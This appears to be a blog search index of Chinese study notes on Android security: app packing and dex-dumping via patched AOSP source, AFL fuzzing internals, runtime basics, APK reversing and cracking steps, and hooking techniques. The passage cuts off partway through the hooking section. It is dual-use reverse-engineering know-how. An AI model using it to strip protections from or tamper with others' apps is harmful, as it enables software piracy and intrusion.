<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>APP加壳脱壳</title>
    <url>/2022/04/11/APP%E5%8A%A0%E5%A3%B3%E8%84%B1%E5%A3%B3/</url>
    <content><![CDATA[<h1 id="APP壳相关知识"><a href="#APP壳相关知识" class="headerlink" title="APP壳相关知识"></a>APP壳相关知识</h1><p>app运行流程：</p>
<ol>
<li>BootClassLoader加载系统核心库</li>
<li>PathClassLoader加载 APP自身dex</li>
<li>进入APP自身组件开始执行</li>
<li>调用声明Application的 attachBaseContext</li>
<li>调用声明Application的onCreate</li>
</ol>
<p>app最先获得执行权限的是app中声明的Application类中的attachBaseContext和onCreate函数，所以壳对代码进行解密一般都在这两个函数上进行。</p>
<span id="more"></span>

<p><strong>加壳程序的运行流程：</strong></p>
<ol>
<li>app启动</li>
<li>自定义Application中 attachBaseContext的实现<ul>
<li>解密源程序</li>
<li>初始化自定义加载器类</li>
<li>反射设置LoadedApk中加载器对象为自定义加载器</li>
</ul>
</li>
<li>自定义Application中的onCreate方法实现、<ul>
<li>获取源程序中的Application名称</li>
<li>反射生成正确的Application对象</li>
<li>反射设置ActivityThread中的Application信息</li>
</ul>
</li>
<li>Activity加载流程：源程序正常运行</li>
</ol>
<p>当壳在函数attachBaseContext和onCreate中执行完加密的dex文件的解密后，通过自定义的Classloader在内存中加载解密后的dex文件</p>
<ul>
<li>这里注意，动态加载的dex文件不具备生命周期特征，app中的activity、service等 组件无法正常工作，只能完成一般函数的调用。（不具备双亲委派的特征，pathclassloader找不到相关的组件）</li>
<li>所以需要对classLoader进行修正，通常有两种修正手段：<ul>
<li>反射替换：通过修改app组件内的pathClassLoader(mClassLoader),然后将其替换成dexClassLoader</li>
<li>反射插入：在BootClassLoader和PathClassLoader之间 插入DexClassLoader</li>
</ul>
</li>
</ul>
<p>只要获取到加固应用最终通过反射设置后的Classloader，我们就可以通过一系列反射最终获取到当前应用所加载的解密后的内存中的Dex文件。</p>
<h1 id="加壳手段"><a href="#加壳手段" class="headerlink" title="加壳手段"></a>加壳手段</h1><ul>
<li>dex整体保护<ul>
<li>文件加载：定位解密文件是关键</li>
<li>内存加载：加载时机和内存起始地址是关键</li>
<li>通用方案：dex打开和优化的流程以及产出的odex、dex2oat,编译的流程和生成的oat文件等等</li>
</ul>
</li>
<li>函数抽取:获取到dex之后，函数体无效<ul>
<li>1.类加载和函数执行前的流程解密</li>
<li>2.函数执行中动态解密</li>
<li>方案：关注被抽取的函数的执行流程是关键，定位被抽取的函数的恢复时机即可</li>
</ul>
</li>
<li>vmp &amp; dex2c  函数基本变成了native。vmp使用的是同一个解释器，所以注册地址\入口地址是一样的，<ul>
<li>1.VMP：定位解释器是关键，找到映射关键便可恢复；</li>
<li>2.dex2c：基础是编译原理，进行了等价语义转换，彻底还原难度大</li>
<li>方案：关注JNI相关的api调用是关键，也是分析VMP和dex2c保护函数的逻辑的关键</li>
</ul>
</li>
</ul>
<h2 id="脱壳手段"><a href="#脱壳手段" class="headerlink" title="脱壳手段"></a>脱壳手段</h2><ol>
<li><p>dex整体加壳</p>
<ul>
<li><p>直接dump内存，可以修改Android源码，修改关键的函数，在加载dex文件的时候直接将其文件路径以及大小直接保存到手机里面的文件中，为了防止一些对抗手段，可以使用Android源码里面的文件操作函数来对文件进行读写。</p>
</li>
<li><p>Dalivk脱壳点：只要是加载目标dex文件的函数处都是可以得到文件的相关信息的在这里都可以对其进行脱壳  dexFileParse()</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line">  <span class="comment">//可以在DexFile.cpp DvmDex.cpp DexPrepare.cpp DexSwapVerify.cpp中相关位置添加如下代码</span></span><br><span class="line">  <span class="type">char</span> dexfilepath[<span class="number">100</span>] =&#123;<span class="number">0</span>&#125;;</span><br><span class="line">  <span class="type">int</span> pid = <span class="built_in">getpid</span>();</span><br><span class="line">  <span class="built_in">sprintf</span>(dexfilepath,<span class="string">&quot;/sdcard/%d_%d_dvmContiueOptimization.dex&quot;</span>,length,pid);</span><br><span class="line">  <span class="type">int</span> fd = <span class="built_in">open</span>(dexfilepath,O_CREATE|O_RDWR,<span class="number">0666</span>);</span><br><span class="line">  <span class="keyword">if</span>(fd&gt;<span class="number">0</span>)&#123;</span><br><span class="line">  	<span class="built_in">write</span>(fd,data,length);</span><br><span class="line">  	<span class="built_in">close</span>(fd);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">- ART下的脱壳点</span><br><span class="line"></span><br><span class="line">  ```cpp</span><br><span class="line">  <span class="comment">//InMemoryDexClassLoader源码分析</span></span><br><span class="line">  <span class="number">1</span>、<span class="function"><span class="type">static</span> jobject <span class="title">CreateSingleDexFileCookie</span><span class="params">(JNIEnv* env, std::unique_ptr&lt;MemMap&gt; data)</span></span></span><br><span class="line"><span class="function">  2、<span class="type">static</span> <span class="type">const</span> DexFile* <span class="title">CreateDexFile</span><span class="params">(JNIEnv* env, std::unique_ptr&lt;MemMap&gt; dex_mem_map)</span></span></span><br><span class="line"><span class="function">  3、<span class="title">DexFile::Open</span><span class="params">(location,</span></span></span><br><span class="line"><span class="params"><span class="function">  <span class="number">4</span>、OpenCommon(map-&gt;Begin()</span></span></span><br><span class="line"><span class="params"><span class="function">  <span class="number">5</span>、DexFile::DexFile(<span class="type">const</span> <span class="type">uint8_t</span>* base,</span></span></span><br><span class="line"><span class="params"><span class="function">                     </span></span></span><br><span class="line"><span class="params"><span class="function">  <span class="comment">//DexClassLoader源码分析</span></span></span></span><br><span class="line"><span class="params"><span class="function">  <span class="number">1</span>、OpenAndReadMagic(filename, &amp;magic, error_msg);</span></span></span><br><span class="line"><span class="params"><span class="function">  <span class="number">2</span>、DexFile::OpenCommon(<span class="type">const</span> <span class="type">uint8_t</span>* base,</span></span></span><br><span class="line"><span class="params"><span class="function">  <span class="number">3</span>、DexFile::DexFile(<span class="type">const</span> <span class="type">uint8_t</span>* base,               </span></span></span><br></pre></td></tr></table></figure></li>
</ul>
</li>
</ol>
<p>dex整体保护脱壳示例：</p>
<ul>
<li>首先在加载dex文件处的Android源码处修改源码，添加代码使得dex文件存储在手机上面</li>
<li>编译Android源码（lunch , time make -j4）</li>
<li>将产生的镜像文件拖出来，然后替换相关的Android手机的镜像文件<ul>
<li>adb connect 127.0.0.1:21503</li>
<li>将手机弄到bootloader模式：adb reboot bootloader</li>
<li>将img刷到手机上 ：fastboot [-s 864155433723779] flash system system.img</li>
<li>然后启动手机，点开app，就可以看到脱下来的dex文件</li>
<li>查看手机或者模拟器的架构：adb shell getprop ro.product.cpu.abi</li>
</ul>
</li>
</ul>
<h1 id="参考文档"><a href="#参考文档" class="headerlink" title="参考文档"></a>参考文档</h1><p><a href="https://bbs.pediy.com/thread-252630.htm">https://bbs.pediy.com/thread-252630.htm</a></p>
<p>Android源码：<a href="http://aospxref.com/">http://aospxref.com/</a></p>
]]></content>
      <categories>
        <category>Android安全</category>
        <category>加壳脱壳</category>
      </categories>
      <tags>
        <tag>Android安全</tag>
        <tag>加壳脱壳</tag>
      </tags>
  </entry>
  <entry>
    <title>AFL fuzz whitepaper</title>
    <url>/2021/11/08/AFL-fuzz-whitepaper/</url>
    <content><![CDATA[<h1 id="Technical-“whitepaper”-for-afl-fuzz"><a href="#Technical-“whitepaper”-for-afl-fuzz" class="headerlink" title="Technical “whitepaper” for afl-fuzz"></a>Technical “whitepaper” for afl-fuzz</h1><h2 id="Design-statement"><a href="#Design-statement" class="headerlink" title="Design statement"></a>Design statement</h2><p>该工具可以被认为是黑客的集合（可以在实际中测试），是有效的，并且是已实现的，最健壮的工具。</p>
<p>原则：速度、可靠性、易使用</p>
<span id="more"></span>

<h2 id="Coverage-measurements"><a href="#Coverage-measurements" class="headerlink" title="Coverage measurements"></a>Coverage measurements</h2><p>这个插桩注入到编译好的程序来获取分支覆盖率</p>
<p>注入点：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cur_location = &lt;COMPILE_TIME_RANDOM&gt;;</span><br><span class="line">shared_mem[cur_location ^ prev_location]++; </span><br><span class="line">prev_location = cur_location &gt;&gt; 1;</span><br></pre></td></tr></table></figure>

<p>cur_location是随机生成来简化链接复杂项目的并且保持XOR输出均匀分布。</p>
<p>shared_mem[]是64KB的一个共享内存区域，被调用者传递给插桩二进制</p>
<p>输出映射中设置的每个字节都可以看作是插入指令的代码中特定（branch_src，branch_dst）元组的命中</p>
<p>coverage的形式：元组</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">A -&gt; B -&gt; C -&gt; D -&gt; E (tuples: AB, BC, CD, DE)</span><br><span class="line">A -&gt; B -&gt; D -&gt; C -&gt; E (tuples: AB, BD, DC, CE)</span><br></pre></td></tr></table></figure>

<p>这有助于发现底层代码中的细微故障条件，因为安全漏洞通常与意外或不正确的状态转换相关，而不仅仅是与到达新的基本块相关。</p>
<h2 id="Detecting-new-behaviors"><a href="#Detecting-new-behaviors" class="headerlink" title="Detecting new behaviors"></a>Detecting new behaviors</h2><p>fuzzer维护在以前的执行中看到的元组的全局映射，可以与单路径进行快速比较，并且使用简单的循环和几条简单的之类就可以进行更新。</p>
<p>当一个变异之后的输入的执行路径包含新的元组的时候，该输入便会被保留下来。否则将会被丢弃，即使他们的控制流图是唯一的。</p>
<p>这种方法允许对程序状态进行非常细粒度和长期的探索，而不必对复杂的执行跟踪执行任何计算密集和脆弱的全局比较，同时避免了路径爆炸。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#1: A -&gt; B -&gt; C -&gt; D -&gt; E</span><br><span class="line">#2: A -&gt; B -&gt; C -&gt; A -&gt; E</span><br><span class="line">#2包含了新的元组（CA, AE），所以他是新的</span><br><span class="line">#3: A -&gt; B -&gt; C -&gt; A -&gt; B -&gt; C -&gt; A -&gt; B -&gt; C -&gt; D -&gt; E</span><br><span class="line">但是#3不是unique的</span><br></pre></td></tr></table></figure>

<p>此外除了考虑新的元组外，AFL还粗略统计了到达的元组数目，他们被分到下面的几个区间bucket：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1, 2, 3, 4-7, 8-15, 16-31, 32-127, 128+</span><br></pre></td></tr></table></figure>

<p>bucket的数量是一个实现工件：它允许将插装生成的8位计数器就地映射到fuzzer可执行文件依赖的8位位图，以跟踪每个元组已经看到的执行计数。bucket之内的变化会被忽略。</p>
<h2 id="Evolving-the-input-queue"><a href="#Evolving-the-input-queue" class="headerlink" title="Evolving the input queue"></a>Evolving the input queue</h2><p>已经变异了的测试用例，如果产生一个新的状态，就会被添加到输入队列中，并且作为将来的fuzzing的一个开始点。</p>
<p>这个方法主要是为了让AFL探索分散的和尽可能多不可比的数据格式特点。</p>
<h2 id="Culling-the-corpus"><a href="#Culling-the-corpus" class="headerlink" title="Culling the corpus"></a>Culling the corpus</h2><p>AFL为了保证效率，AFL会定期重新评估输入队列，选出测试用例的一个子集，同时可以保证任然可以覆盖每个元组。</p>
<p>算法原理：为每个队列分配一个于其执行文件大小成比例的分数，然后为每个元组选择得分最低的候选项。</p>
<p>元组的处理流程：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1) Find next tuple not yet in the temporary working set,</span><br><span class="line"></span><br><span class="line">2) Locate the winning queue entry for this tuple,</span><br><span class="line"></span><br><span class="line">3) Register *all* tuples present in that entry&#x27;s trace in the working set,</span><br><span class="line"></span><br><span class="line">4) Go to #1 if there are any missing tuples in the set.</span><br></pre></td></tr></table></figure>

<p>被判断成favored的实体，通常比原始数据集小5-10倍。被判断成non-favored的实体不会被丢弃，只是当遇见的时候会有一定的概率跳过：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">- If there are new, yet-to-be-fuzzed favorites present in the queue, 99% of non-favored entries will be skipped to get to the favored ones.</span><br><span class="line"></span><br><span class="line">- If there are no new favorites:</span><br><span class="line"></span><br><span class="line">  - If the current non-favored entry was fuzzed before, it will be skipped 95% of the time.</span><br><span class="line"></span><br><span class="line">  - If it hasn&#x27;t gone through any fuzzing rounds yet, the odds of skipping drop down to 75%.</span><br></pre></td></tr></table></figure>

<p>this provides a reasonable balance between queue cycling speed and test case diversity.</p>
<p>afl-cmin: 稍微有点复杂，但是更慢的一个缩减方法。</p>
<h2 id="Trimming-input-files"><a href="#Trimming-input-files" class="headerlink" title="Trimming input files"></a>Trimming input files</h2><p>有些类型的变异策略可能会迭代增加生成文件的大小。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">trimmer </span><br></pre></td></tr></table></figure>

<p>afl-tmin：是独立运行的，使用更详尽的迭代算法，还尝试对修剪过的文件执行字母表规范化。</p>
<p>他的操作如下：</p>
<ul>
<li>首先，这个工具自动选择工作模式。如果初始化输入让目标二进制文件崩溃，afl-min将会使用未插桩的模式，并且简单对输入进行调整（产生更加简单的文件，但是任然是可以产生crash）；如果目标没有崩溃，他就会使用插桩的模式，并且保持调整（产生同样的执行路径）。</li>
</ul>
<p>实际的算法是：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1) Attempt to zero large blocks of data with large stepovers. Empirically, this is shown to reduce the number of execs by preempting finer-grained efforts later on.</span><br><span class="line"></span><br><span class="line">2) Perform a block deletion pass with decreasing block sizes and stepovers, binary-search-style. </span><br><span class="line"></span><br><span class="line">3) Perform alphabet normalization by counting unique characters and trying to bulk-replace each with a zero value.</span><br><span class="line"></span><br><span class="line">4) As a last result, perform byte-by-byte normalization on non-zero bytes.</span><br><span class="line">- Sequential bit flips with varying lengths and stepovers,</span><br><span class="line"></span><br><span class="line">- Sequential addition and subtraction of small integers,</span><br><span class="line"></span><br><span class="line">- Sequential insertion of known interesting integers (0, 1, INT_MAX, etc),</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>Fuzzing</category>
        <category>AFL</category>
      </categories>
      <tags>
        <tag>Fuzzing</tag>
      </tags>
  </entry>
  <entry>
    <title>Android基础</title>
    <url>/2022/04/13/Android%E5%9F%BA%E7%A1%80/</url>
    <content><![CDATA[<h1 id="Activity生命周期"><a href="#Activity生命周期" class="headerlink" title="Activity生命周期"></a>Activity生命周期</h1><img src="https://raw.githubusercontent.com/Dfault0/images/main/20220413191810.png" style="zoom:40%;" />

<span id="more"></span>

<h1 id="Android基本知识"><a href="#Android基本知识" class="headerlink" title="Android基本知识"></a>Android基本知识</h1><h2 id="ART-amp-Dalvik-amp-JVM"><a href="#ART-amp-Dalvik-amp-JVM" class="headerlink" title="ART &amp; Dalvik &amp; JVM"></a>ART &amp; Dalvik &amp; JVM</h2><p><strong>Dalvik:</strong></p>
<ul>
<li>基于寄存器，运行dex文件</li>
<li>.dex格式是专为Dalvik设计的一种压缩格式，适合内存和处理器速度有限的系统</li>
<li>每一个Dalvik 应用作为一个独立的Linux 进程执行</li>
<li>实现在libdvm.so中</li>
<li>应用每次运行的时候，字节码都需要通过即时编译器（just in time ，JIT）转换为机器码（这回拖慢程序的运行）</li>
</ul>
<p><strong>ART：</strong></p>
<ul>
<li>Android runtime</li>
<li><strong>预编译（AOT ahead-of-time</strong>）:应用在第一次安装的时候，字节码就会预先编译成机器码，使其成为真正的本地应用，</li>
<li>ART包括一个编译器（dex2oat工具）和一起启动Zygote而加载的运行时（libart.so）。</li>
<li>怎么对其进行apk进行编译可以进行配置（安装的时候就全部编译、前几次运行记录下常执行的方法，然后对其进行AOT编译等）</li>
<li>dex2oat接受一个apk文件，并生成多个编译工件文件，然后运行时会加载这些文件。在Android O版本中，会生成一下文件<ul>
<li>.vedx:其中包含apk的未压缩dex代码，以及一些旨在加快验证速度的元数据</li>
<li>.odex:包含APK中已经经过AOT编译的方法的代码</li>
<li>.art(optional):包含APK中列出的某些字符串和类的ART内部表示，用于加快应用启动速度</li>
</ul>
</li>
</ul>
<p><strong>jvm（Java Virtual Machine）:</strong></p>
<ul>
<li>基于栈，运行Java字节码</li>
</ul>
<h1 id="参考文档"><a href="#参考文档" class="headerlink" title="参考文档"></a>参考文档</h1><p>art详解：<a href="https://sufushi.github.io/2017/10/27/ART%E6%9C%BA%E5%88%B6%E6%9E%B6%E6%9E%84%E8%AF%A6%E8%A7%A3/">https://sufushi.github.io/2017/10/27/ART%E6%9C%BA%E5%88%B6%E6%9E%B6%E6%9E%84%E8%AF%A6%E8%A7%A3/</a></p>
]]></content>
      <categories>
        <category>Android</category>
        <category>基础知识</category>
      </categories>
      <tags>
        <tag>Android</tag>
      </tags>
  </entry>
  <entry>
    <title>Android软件安全权威指南-学习笔记</title>
    <url>/2022/04/13/Android%E8%BD%AF%E4%BB%B6%E5%AE%89%E5%85%A8%E6%9D%83%E5%A8%81%E6%8C%87%E5%8D%97/</url>
    <content><![CDATA[<h1 id="逆向一个app的常规步骤"><a href="#逆向一个app的常规步骤" class="headerlink" title="逆向一个app的常规步骤"></a>逆向一个app的常规步骤</h1><ol>
<li><p>使用apktool反编译apk</p>
<ul>
<li>Apktool_2.6.1.jar d app-release.apk -o outputdir</li>
</ul>
</li>
<li><p>查看资源文件中的string.xml</p>
</li>
<li><p>寻找相关的字符串对应的id号</p>
</li>
<li><p>搜索整个反编译文件内容 id号</p>
</li>
<li><p>继续分析</p>
</li>
<li><p>找到smali文件，然后查看逻辑，并破解apk</p>
</li>
<li><p>回编译apk、签名</p>
</li>
<li><p>验证</p>
<span id="more"></span></li>
</ol>
<h1 id="dex文件结构"><a href="#dex文件结构" class="headerlink" title="dex文件结构"></a>dex文件结构</h1><p>dex文件是Android系统的可执行文件，默认小端字节序（Little-Endian：低位字节再内存的低地址）</p>
<table>
<thead>
<tr>
<th>字段名</th>
<th align="center">信息</th>
</tr>
</thead>
<tbody><tr>
<td>header</td>
<td align="center">dex文件头部，记录整个dex文件的相关属性（magic固定：64 65 78 0a 30 33 35 00）   总长：0x70</td>
</tr>
<tr>
<td>string_ids</td>
<td align="center">字符串数据索引，记录了每个字符串在数据区的偏移量</td>
</tr>
<tr>
<td>type_ids</td>
<td align="center">类似数据索引，记录了每个类型的字符串索引</td>
</tr>
<tr>
<td>proto_ids</td>
<td align="center">原型数据索引，记录了方法声明的字符串，返回类型字符串，参数列表</td>
</tr>
<tr>
<td>field_ids</td>
<td align="center">字段数据索引，记录了所属类，类型以及方法名</td>
</tr>
<tr>
<td>method_ids</td>
<td align="center">类方法索引，记录方法所属类名，方法声明以及方法名等信息</td>
</tr>
<tr>
<td>class_defs</td>
<td align="center">类定义数据索引，记录指定类各类信息，包括接口，超类，类数据偏移量</td>
</tr>
<tr>
<td>data</td>
<td align="center">数据区，保存了各个类的真是数据</td>
</tr>
</tbody></table>
<p>dex文件分析示例：</p>
<p><img src="https://raw.githubusercontent.com/Dfault0/images/main/20220413185118.png" alt="图片分析示例"></p>
<p><img src="https://raw.githubusercontent.com/Dfault0/images/main/20220413185509.png"></p>
<p>jar文件转成dex文件</p>
<img src="https://raw.githubusercontent.com/Dfault0/images/main/20220414154101.png" style="zoom:40%;" />



<p><strong>java虚拟机基于栈，Dalvik是基于寄存器</strong></p>
<h1 id="Dalvik"><a href="#Dalvik" class="headerlink" title="Dalvik"></a>Dalvik</h1><p>zygote是Android系统中所有进程的孵化器进程。</p>
<ul>
<li>zygote启动后，会先初始化Dalvik虚拟机，</li>
<li>再启动system_server进程并进入zygote模式，通过socket等候命令下达。</li>
<li>在执行一个Android应用程序的时候，system_server进程通过binder IPC方式将命令发送给zygote。</li>
<li>zygote收到命令之后通过fork其自身创建一个dalvik虚拟机实例来执行应用程序的入口函数，从而完成应用程序的启动过程。</li>
</ul>
<p><a href="https://juejin.cn/post/6844904116561379341">https://juejin.cn/post/6844904116561379341</a></p>
<ul>
<li>fp是arm的栈帧寄存器</li>
<li>dalvik寄存器命令方式：<ul>
<li>v命名法：一个函数使用了m个寄存器（每个寄存器32位），且有n个参数， 参数使用最后的n个寄存器，vm-n - this，v0-vm-n-1表示的是局部变量使用的</li>
<li>p命名法：函数中传入的参数从p0开始增加，其他的和v命名法一样</li>
</ul>
</li>
</ul>
<p><strong>dalvik字节码类型描述符</strong></p>
<table>
<thead>
<tr>
<th>语法</th>
<th>含义</th>
</tr>
</thead>
<tbody><tr>
<td>v</td>
<td>void</td>
</tr>
<tr>
<td>Z</td>
<td>bool</td>
</tr>
<tr>
<td>B</td>
<td>BYTE</td>
</tr>
<tr>
<td>S</td>
<td>SHORT</td>
</tr>
<tr>
<td>C</td>
<td>CHAR</td>
</tr>
<tr>
<td>I</td>
<td>INT</td>
</tr>
<tr>
<td>J</td>
<td>LONG</td>
</tr>
<tr>
<td>F</td>
<td>FLOAT</td>
</tr>
<tr>
<td>D</td>
<td>DOUBLE</td>
</tr>
<tr>
<td>L</td>
<td>JAVA类类型 可以表示Java中的任何类   Lpackage&#x2F;name.ObjectName; (package.name.ObjectName)</td>
</tr>
<tr>
<td>[</td>
<td>数组</td>
</tr>
</tbody></table>
<p>跳转指令：</p>
<ul>
<li>goto</li>
<li>switch</li>
<li>if</li>
</ul>
<p><u>dex文件的验证与校验：</u></p>
<ul>
<li><p>checksum：调用adler32()来完成计算，跳过了DexHeader的magic与checksum字段，将后面到文件的结果作为计算数据的总长度。</p>
</li>
<li><p>签名验证：跳过magic、checksum、signature字段，调用dexComputeSHA1Digest()，将计算结果与signature中保存的值进行比较，如果相等就通过</p>
</li>
</ul>
<h2 id="dex2jar使用"><a href="#dex2jar使用" class="headerlink" title="dex2jar使用"></a>dex2jar使用</h2><ul>
<li>下载 <a href="https://link.jianshu.com/?t=https://github.com/pxb1988/dex2jar">dex2jar</a>，并解压</li>
<li>下载class反编译工具 <a href="https://link.jianshu.com/?t=http://jd.benow.ca/">jd-gui</a>，并解压</li>
<li>将测试的安装包xxx.apk后缀改为.zip，解压后拷贝<code>classes.dex</code>文件到dex2jar文件目录下，cmd进入改目录，执行<code>d2j-dex2jar.bat classes.dex</code>命令，会生成classes-dex2jar.jar文件；</li>
<li>打开jd-gui工具，然后将生成的classes-dex2jar.jar文件拖进去，即可看见反编译的文件</li>
</ul>
<h1 id="IDA动态调试APK"><a href="#IDA动态调试APK" class="headerlink" title="IDA动态调试APK"></a>IDA动态调试APK</h1><ol>
<li>使用adb连接模拟器 ：adb connect 127.0.0.1:5555</li>
<li>将ida IDA下面的dbgsrv这个路径中的 android_server adb push 到手机中的 &#x2F;data&#x2F;local&#x2F;tmp目录下 并且运行起来</li>
</ol>
<ul>
<li>adb -s 127.0.0.1:5555 push android_server &#x2F;data&#x2F;local&#x2F;tmp</li>
</ul>
<ol start="3">
<li>将apk载入ida，然后选中classes.dex文件，并设置调试的入口等</li>
</ol>
<h1 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h1><ol>
<li><p>Android安全面经：<a href="https://blog.xhyeax.com/2021/12/01/2022-autumn-mobile-security-interview-experience/">https://blog.xhyeax.com/2021/12/01/2022-autumn-mobile-security-interview-experience/</a></p>
</li>
<li><p>dex文件结构详解：<a href="https://www.jianshu.com/p/f7f0a712ddfe">https://www.jianshu.com/p/f7f0a712ddfe</a></p>
</li>
<li><p>dex文件结构图解：<a href="https://github.com/cckenny/2020_autumn_mobile_security_interview/blob/main/pics/DEX.png">https://github.com/cckenny/2020_autumn_mobile_security_interview/blob/main/pics/DEX.png</a></p>
</li>
</ol>
]]></content>
      <categories>
        <category>Android安全</category>
        <category>书籍笔记</category>
      </categories>
      <tags>
        <tag>Android安全</tag>
      </tags>
  </entry>
  <entry>
    <title>Android 存储相关信息</title>
    <url>/2022/03/23/Android-%E5%AD%98%E5%82%A8%E7%9B%B8%E5%85%B3%E4%BF%A1%E6%81%AF/</url>
    <content><![CDATA[<h1 id="从物理结构上来区分："><a href="#从物理结构上来区分：" class="headerlink" title="从物理结构上来区分："></a>从物理结构上来区分：</h1><ul>
<li>Android 4.4<ul>
<li>内部存储 internal storage</li>
<li>外部存储 external storage （sdCard）</li>
</ul>
</li>
<li>Android 4.4以上<ul>
<li>手机自身存储结构<ul>
<li>内部存储 internal storage</li>
<li>内置的外部存储</li>
</ul>
</li>
<li>外部存储 external storage （sdCard）<span id="more"></span></li>
</ul>
</li>
</ul>
<h1 id="internal-storage"><a href="#internal-storage" class="headerlink" title="internal storage"></a>internal storage</h1><ul>
<li>app目录：手机已安装的app的apk存放目录</li>
<li>data目录：是各个APP存放自己私有数据的位置：shared preference, sqlite, cach。这些数据别人无法访问</li>
</ul>
<h1 id="external-storage"><a href="#external-storage" class="headerlink" title="external storage"></a>external storage</h1><ul>
<li>data目录：存放非系统app的对应包名的数据，也是私有数据。</li>
</ul>
]]></content>
      <categories>
        <category>Android</category>
        <category>基础知识</category>
      </categories>
      <tags>
        <tag>Android</tag>
      </tags>
  </entry>
  <entry>
    <title>HOOK与注入</title>
    <url>/2022/05/10/HOOK%E4%B8%8E%E6%B3%A8%E5%85%A5/</url>
    <content><![CDATA[<h1 id="Hook"><a href="#Hook" class="headerlink" title="Hook"></a>Hook</h1><h2 id="Dalvik-Hook"><a href="#Dalvik-Hook" class="headerlink" title="Dalvik Hook"></a>Dalvik Hook</h2><p><strong>主要是通过Java反射机制获取目标函数，然后再修改其method结构体的各个字段</strong></p>
<p>由于Dalvik虚拟机所运行 的系统版本低于Android 5.0， 早期安全研究人员对Java层的Hook 的研究集中在Dalvik虚拟机上。 那个时期的Hook技术能够实现， 得益于如下三个方面。</p>
<ol>
<li>Java语言的反射机制。 对Dalvik虚拟机中任何一个Java类的方法 进行Hook，其本质就是 对Java语言中的Method类进行Hook操作。 通过Java 的反射机制，DEX文件中的代码很容 易就能访问自己内存空间中的 任何类的方法信息。 在Dalvik虚拟机中， 每个Java类的方法 都对 应于java&#x2F;lang&#x2F;reflect&#x2F;Method类。</li>
<li>Dalvik虚拟机底层的Java方法实现。 在Dalvik虚拟机中，Java方法 的定义位于Android源 码文件 dalvik&#x2F;vm&#x2F;oo&#x2F;Object.h中。Method结构体中的字段完整地描述了一个Java方法的信息。 可以将它们的值修改为目标方 法的相应字段，就可以对其进行hook</li>
<li>可以修改自身进程空间的内存。 在Linux类操作系统中 进程对自身内存 空间的数据有绝对的控制权。</li>
</ol>
<h2 id="ART-Hook"><a href="#ART-Hook" class="headerlink" title="ART Hook"></a>ART Hook</h2><p>ART出现：Android 5.0及更高的版本，其原理和Dalvik Hook类似，都是修改目标函数的字段</p>
<ul>
<li>在API24及之后版本的Android系统中， 通过 getDeclaredMethod()方法，返回的一 个AbstractMethod抽象 方法对象， </li>
<li>然后， 通过调用getDeclared()获 取它的artMethod 字段， 进而获取它的具体的方法 类 。</li>
<li>ArtMethod 类位于：art&#x2F;runtime&#x2F;art method.h中</li>
</ul>
<h2 id="LD-PRE-LOAD-Hook"><a href="#LD-PRE-LOAD-Hook" class="headerlink" title="LD_PRE LOAD Hook"></a>LD_PRE LOAD Hook</h2><p>LD_PRE LOAD Hook是Linux系统的一个环境变量</p>
<ul>
<li>动态链接：动态链接没有把函数编译到可执行文件中， 而 在程序运行时动态加载</li>
<li>静态链接：把所有的函数全部编译到可执行文件中</li>
</ul>
<p>只需通过该环境变量预先 指定想要加载的动态链接库文件列表， 在程序运行时，系统就会优先加载这个动态链接库列表中 的动态库， 并通过它的函数信息来设置程序的.pit 节区中的函数。就可以达到hook的目的。</p>
<h2 id="GOT-Hook"><a href="#GOT-Hook" class="headerlink" title="GOT Hook"></a>GOT Hook</h2><p><strong>思路：修改内存中ELF与so的符号指针</strong></p>
<p>过程链接 表（Procedure Linkage Table, PL T ）、全局偏移量表（ Global Offset Table, GOT ）</p>
<p>GOT存放再.data区中，可以被修改。在实施GOT Hook时， 出于对兼容性的考虑， 需要同时在.got 与.got.plt节区中查找要Hook 的函数 。</p>
<p>使用GOT Hook自身程序：</p>
<ol>
<li>在自身程序代码中编写要替换的函数 。</li>
<li>待程序加载后， 读取自身内存中的SectionHeader Table， 定 位 .got与.got.plt节区头的信息。 </li>
<li>根据.got与.got.plt节区头的信息定位具体的节区。</li>
<li>查找要替换的函数在内存中的地址。 </li>
<li>用自己编写的函数的地址替换原函数的地址， 完成 Hook工作。</li>
</ol>
<p>GOT Hook外部程序：</p>
<ol>
<li>编写要替换的函数， 并将其编译成so动态库。 </li>
<li>将so注入目标程序进程。</li>
<li>根据目标内存中的Section Header Table， 定位.got与.got.pit节区头的信息。 </li>
<li>根据.got与.got.pit节区头的信息定位具体的节区。 </li>
<li>查找要替换的函数在目标内存中的地址。 </li>
<li>用自己编写的so中要替换的函数的地址替换原函数的地址， 完成Hook工作。</li>
</ol>
<h2 id="lnline-Hook"><a href="#lnline-Hook" class="headerlink" title="lnline Hook"></a>lnline Hook</h2><p>其内联特性主要体现在修改目标函数开始处的汇编指令上。</p>
<p>需要注意以下几点：</p>
<ul>
<li>对不同目标指令集的处理</li>
<li>对跳转指令的处理，系统不同，跳转指令不同，以及修改了跳转指令之后是否会影响后面的指令的执行</li>
<li>对多线程的支持</li>
<li>小函数指令：修改了函数之后，其内存大小大于原来的函数，会影响程序的其他函数的代码。</li>
<li>指令更新</li>
</ul>
<p>其hook步骤如下：</p>
<ol>
<li>在程序中编写替换函数。 </li>
<li>使用 mprotect （）函数将目标函数代码段的属性更改为可写。</li>
<li>保存 “ 现场” 。 定位到需要修改的函数的起始处， 保存 Inline Hook 起始处的指令（保存的 长度为 Inlink Hook 跳转指令的长度）。 同时， 保存当前寄存器的状态。 </li>
